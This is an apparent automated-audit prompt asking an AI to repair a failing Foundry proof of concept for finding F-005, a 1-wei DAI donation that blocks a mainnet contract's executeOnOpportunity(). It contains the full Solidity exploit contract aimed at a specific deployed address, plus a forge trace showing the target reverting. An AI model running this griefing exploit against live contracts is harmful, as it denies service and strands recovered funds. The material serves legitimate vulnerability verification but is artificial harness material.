You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A single wei of DAI can brick every future recovery attempt
- claim: `executeOnOpportunity()` unconditionally tries to liquidate any positive DAI balance. Because Uniswap V2 rounds sufficiently tiny swaps down to zero output, an attacker can transfer 1 wei of DAI to the contract and force `_swapTokenToEth(DAI)` to revert when the router attempts to swap that balance, causing the entire `executeOnOpportunity()` transaction to revert on every run until additional DAI is donated.
- impact: Any external account can cheaply and permissionlessly deny service to the recovery flow, blocking liquidation of legitimately recovered WBTC/USDC/USDT/WETH proceeds as well. Since the contract has no token rescue or dust-clearing path, the griefing balance can persist indefinitely and strand future recoveries.
- exploit_paths: ["An attacker transfers 1 wei of DAI to `FlawVerifier`", "A caller invokes `executeOnOpportunity()`", "`_swapTokenToEth(DAI)` observes `bal > 0` and calls the Uniswap V2 router with `amountIn = 1`", "The swap computes zero ETH output for that tiny amount and reverts, bubbling the failure up", "The whole transaction reverts, so no bounty sweep or liquidation can complete until more DAI is added"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

interface IUniswapV2Router02 {
    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    error DustPurchaseFailed();
    error HypothesisRefuted();
    error TargetDidNotRetainDust();

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _hypothesisValidated = false;

        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiBefore == 0) {
            _buyAndDonateExactDaiDust();
            targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
            if (targetDaiBefore == 0) revert DustPurchaseFailed();
        }

        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        uint256 targetDaiAfter = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfter < targetDaiBefore) {
            revert TargetDidNotRetainDust();
        }

        _hypothesisValidated = true;
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "buy exact 1 wei DAI with public ETH->DAI routing and donate it to TARGET -> ",
                "call TARGET.executeOnOpportunity() -> victim _swapTokenToEth(DAI) sees bal > 0 -> ",
                "tiny Uniswap V2 amountIn rounds to zero WETH out -> router swap reverts -> whole transaction reverts"
            )
        );
    }

    function _buyAndDonateExactDaiDust() internal {
        // The harness pre-funds this verifier with ETH. Using a real router trade is a realistic
        // on-chain way to source already-existing mainnet DAI dust without minting tokens,
        // mocking state, or relying on privileged balances.
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        (bool ok,) = UNI_V2_ROUTER.call{value: address(this).balance}(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapETHForExactTokens.selector,
                1,
                path,
                TARGET,
                block.timestamp
            )
        );

        if (!ok || IERC20(DAI).balanceOf(TARGET) == 0) {
            revert DustPurchaseFailed();
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
000000000000000000000008ba1fdd453c81bd2610000000000000000000000000000000000000000000000000000000067e6bf27
    │   │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 1}()
    │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Stop]
    │   │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11, 1)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x000000000000000000000000a478c2975ab1ea89e8196811f51a7b7ade33eb11
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [60633] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11::swap(1, 0, 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 0x)
    │   │   │   ├─ [28174] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe, 1)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000a478c2975ab1ea89e8196811f51a7b7ade33eb11
    │   │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 4850777486349408127513950 [4.85e24]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 2575770145511146508898 [2.575e21]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000403312ca892307ded755e00000000000000000000000000000000000000000000008ba1fdd453c81bd262
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x000000000000000000000000f3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   ├─ [67] FlawVerifier::receive{value: 999999999999999999999999}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] [1, 1]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 1
    │   ├─ [1400] 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe) [staticcall]
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop]
    ├─ [197] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [321] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 999999999999999999999999 [9.999e23])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22146339 [2.214e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe.executeOnOpportunity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 774.20ms (705.60ms CPU time)

Ran 1 test suite in 800.89ms (774.20ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 208712)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
